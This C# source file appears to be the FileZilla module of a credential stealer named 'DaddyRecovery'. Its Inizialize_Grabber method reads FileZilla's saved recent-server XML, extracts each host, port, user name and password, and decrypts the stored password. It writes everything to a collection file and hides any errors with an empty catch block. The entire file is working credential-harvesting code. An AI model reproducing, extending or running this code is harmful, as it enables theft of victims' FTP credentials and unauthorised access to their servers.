namespace DaddyRecovery.Applications
{
    using System;
    using System.Text;
    using System.Xml;
    using Helpers;

    public static class FileZilla
    {
        public static void Inizialize_Grabber()
        {
            if (CombineEx.ExistsFile(GlobalPath.FZilla))
            {
                var build = new StringBuilder();
                try
                {
                    var xf = new XmlDocument() { XmlResolver = null };
                    xf.Load(GlobalPath.FZilla);

                    XmlNodeList bb = xf.GetElementsByTagName("RecentServers");
                    XmlNodeList bs = ((XmlElement)bb[0]).GetElementsByTagName("Server");

                    foreach (XmlElement va in bs)
                    {
                        build.AppendLine($"HostName: {va.GetElementsByTagName("Host")[0].InnerText}");
                        build.AppendLine($"Port: {va.GetElementsByTagName("Port")[0].InnerText}");
                        build.AppendLine($"UserName: {va.GetElementsByTagName("User")[0].InnerText}");
                        build.AppendLine($"Password: {DecryptTools.DecryptFZ(va.GetElementsByTagName("Pass")[0].InnerText)}{Environment.NewLine}");
                    }
                }
                catch { }
                CombineEx.CreateFile(true, GlobalPath.FileZillaSave, build?.ToString());
                build.Clear();
            }
        }
    }
}